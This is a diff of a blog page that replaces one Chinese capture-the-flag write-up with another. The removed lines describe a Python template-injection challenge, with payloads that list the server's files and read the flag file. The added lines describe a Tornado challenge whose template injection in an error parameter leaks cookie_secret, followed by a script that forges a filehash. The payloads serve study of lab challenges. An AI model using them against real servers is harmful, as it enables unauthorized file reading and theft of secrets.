@@ -16,26 +16,28 @@
   <meta name="author" content="gaifagafin">
   <meta name="keywords" content="">
   
-    <meta name="description" content="第一次做模板注入的题目，参考H师傅的writeup https:&#x2F;&#x2F;blog.csdn.net&#x2F;Mr_helloword&#x2F;article&#x2F;details&#x2F;107949217  进入靶机网址提示 1python template injection  知道这是一道python模板注入 url输入  1http:&#x2F;&#x2F;61.147.171.105:50859&#x2F;&amp;#123;&amp;#123;7*7&amp;#125;&amp;">
+    <meta name="description" content="进入靶机，页面为  打开&#x2F;flag.txt,提示 1flag in &#x2F;fllllllllllllag  打开&#x2F;welcome.txt,提示 1render  在tornado中render为渲染作用 打开&#x2F;hints.txt,提示 1md5(cookie_secret+md5(filename))  提示的是filehash参数的计算方法 通过上面三个的分析，可以得">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界Web_python_template_injection">
-<meta property="og:url" content="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/index.html">
+<meta property="og:title" content="攻防世界 easytornado">
+<meta property="og:url" content="https://gaifagafin.github.io/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/index.html">
 <meta property="og:site_name" content="gaifagafin&#39;s blog">
-<meta property="og:description" content="第一次做模板注入的题目，参考H师傅的writeup https:&#x2F;&#x2F;blog.csdn.net&#x2F;Mr_helloword&#x2F;article&#x2F;details&#x2F;107949217  进入靶机网址提示 1python template injection  知道这是一道python模板注入 url输入  1http:&#x2F;&#x2F;61.147.171.105:50859&#x2F;&amp;#123;&amp;#123;7*7&amp;#125;&amp;">
+<meta property="og:description" content="进入靶机，页面为  打开&#x2F;flag.txt,提示 1flag in &#x2F;fllllllllllllag  打开&#x2F;welcome.txt,提示 1render  在tornado中render为渲染作用 打开&#x2F;hints.txt,提示 1md5(cookie_secret+md5(filename))  提示的是filehash参数的计算方法 通过上面三个的分析，可以得">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2023/10/31/HuKl192fCoAkrVe.png">
-<meta property="og:image" content="https://s2.loli.net/2023/10/31/juF1CO9pcBKzgNi.png">
-<meta property="article:published_time" content="2023-10-31T07:07:48.000Z">
-<meta property="article:modified_time" content="2023-10-31T11:23:20.571Z">
+<meta property="og:image" content="https://s2.loli.net/2023/10/31/VSl8KJM9iPh3RjI.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/31/5gALRmZCsuHcbnO.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/31/HxhavJIi6dpUzYK.png">
+<meta property="og:image" content="d:/Typora/md_images/image-20231031195051979.png">
+<meta property="article:published_time" content="2023-10-31T11:17:42.000Z">
+<meta property="article:modified_time" content="2023-10-31T12:03:38.790Z">
 <meta property="article:author" content="gaifagafin">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="攻防世界">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://s2.loli.net/2023/10/31/HuKl192fCoAkrVe.png">
+<meta name="twitter:image" content="https://s2.loli.net/2023/10/31/VSl8KJM9iPh3RjI.png">
   
   
   
-  <title>攻防世界Web_python_template_injection - gaifagafin&#39;s blog</title>
+  <title>攻防世界 easytornado - gaifagafin&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -201,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="攻防世界Web_python_template_injection"></span>
+            <span id="subtitle" data-typed-text="攻防世界 easytornado"></span>
           
         </div>
 
@@ -212,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-10-31 15:07" pubdate>
-          2023年10月31日 下午
+        <time datetime="2023-10-31 19:17" pubdate>
+          2023年10月31日 晚上
         </time>
       </span>
     
@@ -224,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          935 字
+          1.7k 字
         
       </span>
     
@@ -235,7 +237,7 @@
         
         
         
-          8 分钟
+          14 分钟
         
       </span>
     
@@ -285,44 +287,53 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">攻防世界Web_python_template_injection</h1>
+            <h1 id="seo-header">攻防世界 easytornado</h1>
             
             
               <div class="markdown-body">
                 
-                <p>第一次做模板注入的题目，参考H师傅的writeup <a target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<p><img src="https://s2.loli.net/2023/10/31/HuKl192fCoAkrVe.png" srcset="/img/loading.gif" lazyload></p>
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">python <span class="hljs-keyword">template</span> injection<br></code></pre></td></tr></table></figure>
+                <p><img src="https://s2.loli.net/2023/10/31/VSl8KJM9iPh3RjI.png" srcset="/img/loading.gif" lazyload></p>
+<p>进入靶机，页面为</p>
+<p><img src="https://s2.loli.net/2023/10/31/5gALRmZCsuHcbnO.png" srcset="/img/loading.gif" lazyload></p>
+<p>打开&#x2F;flag.txt,提示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag <span class="hljs-keyword">in</span> /fllllllllllllag<br></code></pre></td></tr></table></figure>
 
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>打开&#x2F;welcome.txt,提示</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">render</span><br></code></pre></td></tr></table></figure>
 
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/49 not found<br></code></pre></td></tr></table></figure>
+<p>在<code>tornado</code>中render为渲染作用</p>
+<p>打开&#x2F;hints.txt,提示</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>))</span><br></code></pre></td></tr></table></figure>
 
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p>提示的是<strong>filehash参数的计算方法</strong></p>
+<p>通过上面三个的分析，可以得出，我们需要构建一个url为</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:62044/file?<br>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))<br></code></pre></td></tr></table></figure>
 
+<p>fllllllllllllag的md5值为<code>594cb6af684ad354b4a59ac496473990</code></p>
+<p>接下来要找到cookie_secret</p>
+<hr>
+<p>cookie_secret获取方法如下：</p>
+<p>render是一个类似模板的东西，可以使用不同的参数来访问网页<br>在tornado模板中，存在一些可以访问的快速对象，例如<br><code>&#123;&#123; escape(handler.settings[“cookie”]) &#125;&#125;</code></p>
+<p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings了！</p>
+<p>大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/128079863">https://blog.csdn.net/yuanxu8877/article/details/128079863</a></p>
+<hr>
+<p>首先我们url输入<code>http://61.147.171.105:62044/file?filename=/flag.txt&amp;filehash=</code> 进入错误页面</p>
+<p><img src="https://s2.loli.net/2023/10/31/HxhavJIi6dpUzYK.png" srcset="/img/loading.gif" lazyload></p>
+<p>输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;1&#125;&#125;</code></p>
+<p>页面返回1，说明存在漏洞，在此处直接注入</p>
+<p>url输入<code>http://61.147.171.105:62044/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
 <p>回显</p>
-<p><img src="https://s2.loli.net/2023/10/31/juF1CO9pcBKzgNi.png" srcset="/img/loading.gif" lazyload></p>
-<p>可以在其中找到 <strong>&lt;type ‘file’&gt;类型</strong> (可以进行文件读取)，下标是40(此项前面有40个’,’)</p>
-<p>还可以看到有一个 <strong>&lt;class ‘site._Printer’&gt;类型</strong>（可以进行命令执行），下标是71，构造payload进行命令执行</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="D:/Typora/md_images/image-20231031195051979.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到cookie_secret值:<code>4beb94e3-3a69-4960-92ab-f83221330eec</code></p>
+<p>编写脚本获取filehash</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_md5</span>(<span class="hljs-params">content</span>):<br>    md5 = hashlib.md5()<br>    md5.update(content.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br>filename=<span class="hljs-string">&quot;/fllllllllllllag&quot;</span><br>cookie_secret=<span class="hljs-string">&quot;4beb94e3-3a69-4960-92ab-f83221330eec&quot;</span><br>no_md5_filehash=cookie_secret+get_md5(filename)<br>filehash=get_md5(no_md5_filehash)<br><span class="hljs-built_in">print</span>(filehash)<br></code></pre></td></tr></table></figure>
 
-<p>回显</p>
-<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">URL <span class="hljs-link">http://61.147.171.105:50859/</span>[<span class="hljs-string">&#x27;index.py&#x27;, &#x27;fl4g&#x27;</span>] not found<br></code></pre></td></tr></table></figure>
-
-<p>接下来构造读取flag payload</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://61.147.171.105:50859/&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;<br></code></pre></td></tr></table></figure>
-
-<p>得到flag：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctf</span>&#123;f22b6844-<span class="hljs-number">5169</span>-<span class="hljs-number">4054</span>-b2a0-d95b9361cb57&#125;<br></code></pre></td></tr></table></figure>
-
-
-
+<p>得到filehash:<code>835b3dbf7a8aabcf5b566e0c276b610c</code></p>
+<p>输入payload:<code>http://61.147.171.105:62044/file?filename=/fllllllllllllag&amp;filehash=835b3dbf7a8aabcf5b566e0c276b610c</code></p>
+<p>得到flag:<code>flag&#123;3f39aea39db345769397ae895edb9c70&#125;</code></p>
 
                 
               </div>
@@ -370,8 +381,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>攻防世界Web_python_template_injection</div>
-      <div>https://gaifagafin.github.io/2023/10/31/攻防世界Web-python-template-injection/</div>
+      <div>攻防世界 easytornado</div>
+      <div>https://gaifagafin.github.io/2023/10/31/攻防世界-easytornado/</div>
     </div>
     <div class="license-meta">
       
@@ -415,18 +426,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/" title="攻防世界 easytornado">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">攻防世界 easytornado</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/10/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%AC%AC%E5%85%AB%E7%89%88-%E7%AC%94%E8%AE%B0%E6%91%98%E5%BD%95/" title="计算机网络-第八版-笔记摘录">
-                        <span class="hidden-mobile">计算机网络-第八版-笔记摘录</span>
+                      <a href="/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/" title="攻防世界Web_python_template_injection">
+                        <span class="hidden-mobile">攻防世界Web_python_template_injection</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
